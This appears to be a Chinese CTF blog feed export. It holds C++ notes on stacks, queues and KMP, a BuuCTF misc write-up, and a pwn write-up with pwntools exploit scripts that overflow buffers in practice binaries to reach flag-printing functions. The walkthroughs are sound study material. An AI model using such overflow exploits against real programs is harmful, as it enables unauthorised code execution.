c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, tt;</span><br><span class="line"><span class="keyword">int</span> stk[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line">        <span class="keyword">while</span> (tt &amp;&amp; stk[tt] &gt;= x) tt --;<span class="comment">//如果栈顶元素大于当前待入栈元素，则出栈</span></span><br><span class="line">        <span class="keyword">if</span> (tt) cout &lt;&lt; stk[tt] &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;<span class="comment">//如果栈空，则没有比该元素小的值</span></span><br><span class="line"></span><br><span class="line">        stk[++ tt] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、队列"><a href="#2、队列" class="headerlink" title="2、队列"></a>2、队列</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hh表示队头，tt表示队尾</span></span><br><span class="line"><span class="comment">// 在队尾插入元素，在队头弹出元素</span></span><br><span class="line"><span class="keyword">int</span> q[N], hh, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素     q[++ tt] = x;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  弹出元素      tt ++;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    判断是否为空</span></span><br><span class="line"><span class="comment">    if (hh &lt;= tt) not empty;</span></span><br><span class="line"><span class="comment">    else empty;</span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">//  取出队头元素    q[hh]</span></span><br></pre></td></tr></table></figure><h4 id="——单调队列"><a href="#——单调队列" class="headerlink" title="——单调队列"></a>——单调队列</h4><p>常见的应用场景：求滑动窗口的最大值和最小值</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110173121154.png" alt="image-20220110173121154"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> a[N], q[N];  <span class="comment">//q[N]存的是数组下标</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断队头是否已经滑出窗口</span></span><br><span class="line">        <span class="comment">// hh与tt比较，判断队列是否为空 </span></span><br><span class="line">        <span class="comment">// 当前滑动窗口的大小(i - k + 1)</span></span><br><span class="line">        <span class="keyword">if</span> (hh &lt;= tt &amp;&amp; i - k + <span class="number">1</span> &gt; q[hh]) hh ++;</span><br><span class="line">        <span class="comment">// 如果新数比队尾小，队尾r</span></span><br><span class="line">        <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; a[q[tt]] &gt;= a[i]) tt --;</span><br><span class="line">        q[++ tt] = i;                          </span><br><span class="line">        <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[q[hh]]);   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="3、KMP"><a href="#3、KMP" class="headerlink" title="3、KMP"></a>3、KMP</h3><p>一个字符串匹配算法，对暴力的那种一一比对的方法进行了优化，使时间复杂度大大降低</p><p>例子：</p><blockquote><p><a href="http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html">http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html</a></p><p><a href="https://www.acwing.com/solution/content/14666/">https://www.acwing.com/solution/content/14666/</a></p></blockquote><p>next[i]存储了以i为终点的后缀，和从1开始的长度相等，且这个后缀的长度最长</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111215754892.png" alt="image-20220111215754892"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111222711179.png" alt="image-20220111222711179"></p><p>==这里的next[5]存储的就是3，即能匹配的最长前缀的末尾字符的下标==</p><p>求next[i]思路</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111221414291.png" alt="image-20220111221414291"></p><p>KMP匹配思路</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111220323339.png" alt="image-20220111220323339"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>, M = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> ne[N];</span><br><span class="line"><span class="comment">//next数组用来存模式串中每个前缀最长的能匹配前缀子串的结尾字符的下标</span></span><br><span class="line"><span class="keyword">char</span> s[M], p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; p + <span class="number">1</span> &gt;&gt; m &gt;&gt; s + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//下标均从1开始</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//求next[]数组</span></span><br><span class="line">    <span class="comment">//j表示匹配成功的长度,i表示q数组中的下标,因为p数组的下标是从1开始</span></span><br><span class="line">    <span class="comment">//的,只有1个时,一定为0,所以i从2开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="comment">//成功了就加1</span></span><br><span class="line">        ne[i] = j;</span><br><span class="line">        <span class="comment">//对应其下标</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//j表示匹配成功的长度,因为刚开始还未开始匹配,所以长度为0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; s[i] !=- p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="comment">//j没有回到开始，且已经匹配好的位置的下一项不再匹配</span></span><br><span class="line">        <span class="comment">//就把比较的小串继续再往后移一次，再比较一次</span></span><br><span class="line">        <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="comment">//匹配成功了,那么j就加1,继续后面的匹配</span></span><br><span class="line">        <span class="keyword">if</span> (j == n)     <span class="comment">//满足匹配条件，打印开头下标, 从0开始</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i - n);</span><br><span class="line">            <span class="comment">//因为题目中的下标从0开始,所以i-j不用+1;</span></span><br><span class="line">            j = ne[j];</span><br><span class="line">            <span class="comment">//为了观察其后续是否还能跟S数组后面的数配对成功</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"/>
    
  </entry>
  
  <entry>
    <title>BuuCTF Pwn WP</title>
    <link href="https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/"/>
    <id>https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/</id>
    <published>2022-01-06T13:54:07.000Z</published>
    <updated>2022-01-12T10:34:10.727Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF-Pwn-WP"><a href="#BuuCTF-Pwn-WP" class="headerlink" title="BuuCTF Pwn WP"></a>BuuCTF Pwn WP</h1><p>题目地址：</p><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>先看一下文件进制和保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222253466.png"></p><p>很好，什么都没开，我们使用64位的ida分析一下文件</p><p>主函数如图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222428407.png" alt="image-20220106222428407"></p><p>gets()函数存在明显风险，双击s，发现占15个字符</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222648915.png" alt="image-20220106222648915"></p><p>查看函数，发现已有后门函数fun</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222906423.png" alt="image-20220106222906423"></p><p>构造exp，因为pwn1为64位程序，所以要补充8字节填上esp，返回fun的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">15</span> + <span class="number">8</span>) + p64(fun)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本脚本在本地打通了程序，但是当笔者打靶机(Unbuntu18)的时候，却怎么也打不通，为什么呢？</p><p>—— ubuntu libc 为 libc2.27，高版本的libc要求是返回地址必须是16字节对齐（也可以说，远程环境是 ubuntu18，64位的程序则需要考虑堆栈平衡的问题）</p><p>我们通过添加一个 ret 指令来使16字节对齐</p><blockquote><p>ROPgadget –binary 文件名 –only “pop|ret”</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106225801614.png" alt="image-20220106225801614"></p><p>找到ret地址，再次构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">15</span> + <span class="number">8</span>) + p64(ret) + p64(fun)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>打通了！！！</p><hr><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>首先检查保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111174521470.png" alt="image-20220111174521470"></p><p>什么都没开，我直呼好耶！</p><p>接着ida分析一下，F5查看伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111175030533.png" alt="image-20220111175030533"></p><p>可以很明显的的发现gets函数存在明显的栈溢出风险，同时我们注意到了sub_40060D函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111175347016.png" alt="image-20220111175347016"></p><p>其中明显有获取flag的指令，我们的思路很明确了，通过栈溢出，返回到system函数的地址即可</p><p>在这里给出两个获取偏移地址的方法：</p><p><strong>方法一</strong></p><p>我们观察到gets函数读入的是v5，而v5偏移量为0x40，再加上64位ELF文件填充esp需要8字节，即72字节</p><p><strong>方法二</strong></p><p>使用gdb来获取</p><p>使用<font color="red"><code>pattern create 200</code></font>生成溢出字符，但注意，在生成时要保证其能覆盖到RIP</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181211228.png" alt="image-20220111181211228"></p><p>执行 <font color="red"><code>r</code> </font>或者<font color="red"> <code>start</code> </font>命令让程序运行。//注意<font color="red"> <code>start</code> </font>命令执行后，还需执行<font color="red"> <code>contin</code> </font>命令。</p><p>在 <font color="red"><code>please input</code> </font>命令后，将之前生成的溢出字符串粘贴上去。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181501942.png" alt="image-20220111181501942"></p><p>（1）得到RBP寄存器中 ‘AAdAA3AA’ 。往该字符串后，随便复制一串，进行偏移量计算</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181737729.png" alt="image-20220111181737729"></p><p>执行 <font color="red"><code>pattern offset xxxxxx</code> </font>命令</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181757313.png" alt="image-20220111181757313"></p><p>（2）复制<font color="red"> <code>stack</code> </font>复制栈顶的字符串  前四个字节（==64 bits为前8个字节==） 计算偏移量</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111182130097.png" alt="image-20220111182130097"></p><p>如上</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111182147634.png" alt="image-20220111182147634"></p><p>构造exp即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/warmup_csaw_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p><strong><font size="5px">知识点：栈溢出    覆盖变量值</font></strong></p><p>首先查看保护机制</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162031003.png" alt="image-20220112162031003"></p><p>跟上面几题不同，本题开启了栈不可执行(NX)，这就是说，上两题中通过直接栈溢出执行shellcode的思路不再适用，下面我们通过ida来分析，首先看主函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162531714.png" alt="image-20220112162531714"></p><p>主函数并没有什么明显的突破点，不过主函数中间还有个func()函数，让我们去看看它</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162631073.png" alt="image-20220112162631073"></p><p>可以发现，func()函数中存在着明显的漏洞，而且，函数中包括了查看flag的命令，通过观察函数我们知道，当v2的值为11.28125时会执行此命令，至此，我们的思路已经非常清晰了——通过v1进行栈溢出，改写v2的值，使<code>cat flag</code>的命令执行</p><p>观察栈</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112163200404.png" alt="image-20220112163200404"></p><p>可知,v1所占的空间为<code>0x30 - 0x04</code>(0x2c)（这里还有第二种理解方法，通过本题的第一幅图我们知道，v2和esp距离为2c，所以直接填上0x2c），同时我们写要输入v2的值（16进制呦），构造如下wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/ciscn_2019_n_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x04</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>第一步，查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165109649.png" alt="image-20220112165109649"></p><p>打开了栈不可执行，使用ida打开观察</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165907727.png" alt="image-20220112165907727"></p><p>主函数引我们去看vuln()函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165942120.png" alt="image-20220112165942120"></p><p>emmm，着实看不太懂，我们能知道的，就是fgets()函数有32字节的输入长度限制，还有明显的“I”和“you”，以及一个replace()替换函数，先去运行一下吧，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112173536176.png" alt="image-20220112173536176"></p><p>我们输入“I”、“you”和随便一个其它字符，可以明显地发现，只有当输入“I”的时候，程序输出的值发生了变化，每个“I”，都分别变成了“you”，所以上面的replace()函数作用应该就是把“I”和”you”替换</p><p>简单了解程序后，我们回到ida，继续观察程序，不难发现，在程序中，存在一个名为“get_flag”的函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112174121664.png" alt="image-20220112174121664"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112175426163.png" alt="image-20220112175426163"></p><p>很明显，这个函数就是我们最后要返回的函数，地址为0x8048F0D</p><p>回到vuln()函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112180401235.png" alt="image-20220112180401235"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112180412540.png" alt="image-20220112180412540"></p><p>我们可以知道，s字符串所占的字节长度为60字节（<code>3 * 16 + 12 = 60 </code>），而fgets()函数规定了输入的长度最长为32，这表明我们通过直接输入字符是无法将s覆盖的，该怎么办呢？</p><p>通过刚才对程序的分析，我们知道，程序会将“I”转换成“you”，这不就将1个字节转换为3个字节了吗！</p><p>需要覆盖60个字节，就只输入20个“I“即可！（==别忘了32位程序ebp的4个字节==）</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1_sctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Pwn入门" scheme="https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_MISC_WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-12-08T14:14:59.000Z</published>
    <updated>2021-12-14T06:36:34.646Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF杂项WP"><a href="#BuuCTF杂项WP" class="headerlink" title="BuuCTF杂项WP"></a>BuuCTF杂项WP</h1><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/aaa.gif"></p><p>仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-25 (8).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26.png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (1).png" style="zoom: 70%;"></div><p>答案显而易见对吧！</p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QR_code.png"></p><p>别怕，扫描一下：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(4).png" style="zoom:33%;"><p>很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_001734.png" style="zoom:50%;"><p>果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破</p><p><img 